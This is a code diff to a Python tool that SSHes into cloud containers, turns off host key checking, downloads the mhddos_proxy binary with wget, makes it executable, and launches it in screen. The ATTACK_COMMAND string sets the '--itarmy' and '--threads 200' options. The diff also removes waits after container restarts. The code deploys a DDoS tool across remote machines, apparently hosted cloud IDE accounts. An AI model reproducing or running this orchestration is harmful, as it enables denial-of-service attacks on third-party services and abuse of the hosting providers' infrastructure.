@@ -22,12 +22,15 @@ CAW_KEYS_DIR = f'caw_keys{os.sep}'
 
 INSTALL_COMMAND = (
     'ssh -o StrictHostKeyChecking=no -i {caw_keys_dir}{email}__{host}__{port} cabox@{host} -p {port} '
-    '-t "rm -rf ./mhddos_proxy && git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git '
-    '&& /home/cabox/.pyenv/shims/pip3 install -r ./mhddos_proxy/requirements.txt"'
+    '-t "sudo apt update -y && sudo apt install --upgrade wget screen -y && '
+    'rm -f ./mhddos* && '
+    'cd ~ && wget https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/'
+    'mhddos_proxy_linux && '
+    'chmod +x mhddos_proxy_linux"'
 )
 ATTACK_COMMAND = (
     'ssh -o StrictHostKeyChecking=no -i {caw_keys_dir}{email}__{host}__{port} cabox@{host} -p {port} '
-    '-t "cd ./mhddos_proxy && ./runner.sh /home/cabox/.pyenv/shims/python3 --lang en --vpn --copies auto --itarmy"'
+    '-t "screen -S "mhddos_proxy" ./mhddos_proxy_linux --lang en --copies auto --itarmy --threads 200"'
 )
 
 
@@ -80,7 +83,6 @@ class Attack:
 
             try:
                 restart(email, os.environ['CAW_PASSWORD'])
-                time.sleep(120)
             except Exception as e:
                 logging.error('container was not restarted: %s', e)
                 continue
@@ -130,7 +132,6 @@ class Attack:
 
             try:
                 restart(email, os.environ['CAW_PASSWORD'])
-                time.sleep(120)
             except Exception as e:
                 logging.error('container was not restarted: %s', e)
 
